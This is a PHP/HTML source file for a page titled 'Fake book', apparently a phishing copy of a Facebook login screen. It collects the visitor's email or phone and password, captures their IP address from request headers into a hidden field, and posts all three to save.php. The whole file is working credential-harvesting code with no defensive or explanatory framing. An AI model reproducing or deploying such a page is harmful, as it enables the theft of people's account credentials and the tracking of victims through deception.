<?php
	$ip = $_SERVER['REMOTE_ADDR'];

    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Fake book</title>
	<link rel="stylesheet" type="text/css" href="css.css">
</head>
<body onload="setFocus();">
	<div id="desktop1">
		<div id="formdesktop">
			<form action="save.php" method="post">
				Email/Phone
				<span id="txtpass">Password</span><br />
				<input type="text" name="user" id="user">
				<input type="password" name="pass">
				<input type="hidden" name="ip" value="<?php echo $ip; ?>">
				<input type="submit" name="submit" value="Login"><br />
				<span id="txtforgot">Forgot?</span>
			</form>
		</div>
	</div>
	<div id="desktop2"></div>
<script type="text/javascript">
	function setFocus(){
		document.getElementById("user").focus();
	}
</script>
</body>
</html>